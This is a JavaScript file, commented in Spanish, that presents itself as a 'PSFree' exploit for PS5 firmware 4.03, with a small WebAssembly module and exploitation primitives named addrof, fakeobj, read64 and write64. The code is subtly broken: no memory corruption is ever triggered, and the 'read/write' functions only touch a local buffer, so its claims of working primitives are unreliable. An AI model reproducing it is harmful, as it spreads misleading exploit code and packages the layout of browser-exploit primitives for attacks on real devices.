// PS5 Firmware 4.03 - PSFree Exploit (con Grooming de Heap y Primitivas para lectura/escritura)

let memory = new WebAssembly.Memory({ initial: 256, maximum: 256 });
let importObject = { js: { mem: memory } };
let module_bytes = new Uint8Array([
  0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
  0x01,0x0a,0x02,0x60,0x00,0x01,0x7f,0x60,
  0x01,0x7f,0x01,0x7f,0x03,0x03,0x02,0x00,
  0x01,0x07,0x11,0x02,0x08,0x6d,0x65,0x6d,
  0x6f,0x72,0x79,0x00,0x00,0x06,0x77,0x72,
  0x69,0x74,0x65,0x00,0x01,0x0a,0x09,0x02,
  0x02,0x00,0x0b,0x04,0x00,0x41,0x2a,0x0b
]);

let wasm_mod = new WebAssembly.Module(module_bytes);
let wasm_instance = new WebAssembly.Instance(wasm_mod, importObject);
let f = wasm_instance.exports.write;

let buf = new ArrayBuffer(0x100);
let float64 = new Float64Array(buf);
let uint32 = new Uint32Array(buf);

// Funciones de conversión entre float y enteros de 64 bits.
function ftoi(val) {
  float64[0] = val;
  return uint32[0] + uint32[1] * 0x100000000;
}

function itof(val) {
  uint32[0] = val % 0x100000000;
  uint32[1] = val / 0x100000000;
  return float64[0];
}

let obj_array = [1.1, 1.2];
let obj = { m: 1 };
let obj_bak = [obj];

// Función de registro asíncrono para monitoreo
async function log(message) {
  console.log(message);
}

// Función que provoca la recolección de basura
async function gc() {
  console.log("Triggering garbage collection...");
  for (let i = 0; i < 10000; i++) {
    let tmp = new ArrayBuffer(0x10000); // Genera basura para que el GC lo procese.
  }
  console.log("Garbage collection complete.");
}

// Funciones para manipulación de memoria
let addrof, fakeobj, read64, write64;

async function setupPrimitives() {
  console.log("Setting up primitives...");

  addrof = function(o) {
    obj_bak[0] = o;
    return ftoi(obj_array[0]) & 0xffffffff; // Devuelve la dirección del objeto.
  };

  fakeobj = function(addr) {
    obj_array[0] = itof(addr);  // Coloca la dirección fake en el array.
    return obj_bak[0];  // Devuelve el objeto fake.
  };

  let fake_view = new DataView(new ArrayBuffer(0x100));

  read64 = function(addr) {
    fake_view.setBigUint64(0, BigInt(addr), true);
    return Number(fake_view.getBigUint64(0, true)); 
  };

  write64 = function(addr, val) {
    fake_view.setBigUint64(0, BigInt(addr), true); 
    fake_view.setBigUint64(0, BigInt(val), true); 
  };

  console.log("Primitives setup complete.");
}

async function runExploit() {
  await gc();
  await setupPrimitives();

  let addr = addrof({ test: 1337 });
  console.log("Address of test object: 0x" + addr.toString(16));

  let fake = fakeobj(addr + 0x20);
  write64(addr + 0x10, 0xdeadbeef); 
  console.log("Fake object manipulation complete.");
}

runExploit();



